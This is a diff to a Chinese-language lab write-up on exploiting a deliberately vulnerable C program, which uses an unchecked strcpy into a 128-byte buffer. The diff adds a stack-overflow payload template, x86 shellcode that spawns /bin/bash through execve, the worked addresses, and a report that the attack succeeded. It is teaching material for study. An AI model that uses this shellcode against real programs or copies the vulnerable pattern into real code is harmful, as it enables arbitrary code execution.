@@ -78,16 +78,16 @@
 
 int main(int argc, char *argv[])
 {
-	char buf[128];
-	char input[2048];
-	printf("%p\n", buf);
-	printf("%p\n", input);
+        char buf[128];
+        char input[2048];
+        printf("%p\n", buf);
+        printf("%p\n", input);
 
-	if (!fgets(input, sizeof(input), stdin))
-		return -1;
+        if (!fgets(input, sizeof(input), stdin))
+                return -1;
 
-	// vulnerable code
-	strcpy(buf, input);
+        // vulnerable code
+        strcpy(buf, input);
 }
 ```
 
@@ -213,6 +213,116 @@ int main(int argc, char *argv[])
 其中，`&ret addr = %ebp + 0x4`，`buf = %ebp - 0x88`，`0x104` 是 payload 的头部长度。整理后得到：
   - `%ecx = buf + 0x90`
   - `ret addr1 = input + 0x104`
+
+## shellcode 代码
+
+shellcode 代码包括 2 个部分：
+
+- 头部的作用是实施缓冲区溢出，主要包括覆写数据
+- 主体的作用是利用 `execve` 系统调用启动一个 shell
+
+### 头部
+
+以下是 shellcode 头部的模板：
+
+```S
+head0:                  # <- begin of buf
+        .rept 0x84
+        .byte 0xFF
+        .endr
+.long [%ecx]            # <- %ecx - 0x4 = &ret addr = %ebp + 0x4
+.long 0xffffffff        # <- %ebp = anything
+
+.long [ret addr1]       # <- ret addr1 = input + 0x104
+.byte 0x00
+
+.org 0x104
+```
+
+`buf` 覆写成功后，栈中的数据布局将变为：
+
+```
++-------------+ <--\
+| [ret addr1] |    |  ret addr1 =/= ret addr0
++-------------+    \-------\
+|  0xffffffff |            |
++-------------+ <---- %ebp |
+|   [%ecx]    | -----------/
++-------------+
+| 0xff...0xff |
++-------------+ <---- buf = %esp - 0x88
+```
+
+方括号中的内容是需要根据程序的实际运行情况进行修改的内容，两个部分应该填写值的计算方法已经在前面给出。
+
+### 主体
+
+shellcode 的主体部分为：
+
+```s
+#include <sys/syscall.h>  
+  
+#define STRING	"/bin/bash\0"
+
+.org 0x104
+main:
+        jmp     calladdr
+
+popladdr:
+        # prepare arg0: syscall number
+        movl    $SYS_execve, %eax
+
+        # prepare arg1: pathname
+        popl    %esi                            # esi points to string
+        movl    %esi, %ebx
+
+        # prepare arg2: argv[]
+        movl    $(argv - string), %ecx
+        addl    %esi, %ecx                      # ecx points to argv
+        movl    %esi, (%ecx)                    # set up argv[0] pointer to pathname
+
+        # prepare arg3: envp[]
+        movl    $(envp - string), %edx
+        addl    %esi, %edx                      # edx points to envp
+
+        # execve("/bin/bash", ["/bin/bash", NULL], [NULL])
+        int     $0x80
+
+calladdr:
+        call    popladdr
+string:
+        .string STRING
+.align 4
+argv:
+        .long 0
+envp:
+        .long 0
+```
+
+主体部分从 payload 的 0x104 偏移处开始，当 payload 注入到 `input` 中后，对应的地址为 `input + 0x104`，也就是借助 `buf` 覆写的 `ret addr1` 的值。
+
+从 `main:` 标签开始，经过了 `jmp calladdr` 和 `call popladdr` 两次跳转后才真正进入系统调用参数的准备环节。这是因为这段代码被加载到了栈上，必须采用位置无关的相对寻址方式，`call` 指令会将 `string:` 标号在栈上的地址压栈，配合后面的 `popl %esi` 直接获得 `string:` 加载后的地址。后面的 `argv:` 和 `envp:` 都是利用它们与 `string:` 的相对地址计算得到的。
+
+shellcode 最终构造了参数为 `execve("/bin/bash", ["/bin/bash", NULL], [NULL])` 的一次系统调用，如果执行成功，则将启动一个 bash。
+
+## 实验结果
+
+首先通过先注入一个大小相同，但地址均为不定值的 payload 确定 `buf` 和 `input` 的地址：
+
+![](./img/perpare.png)
+
+通过上图得知 `buf = 0xffffcc80`，`input = 0xffffc480`，从而：
+
+- `%ecx = buf + 0x88 + 0x4 + 0x4 = 0xffffcd10`
+- `ret addr1 = input + 0x104 = 0xffffc584`
+
+因此修改 shellcode 的头部：
+
+![](./img/shellcode-head.png)
+
+实施攻击，这里成功启动了 bash 并可以运行命令：
+
+![alt text](./img/hacked.png)
 
 ## 参考
 
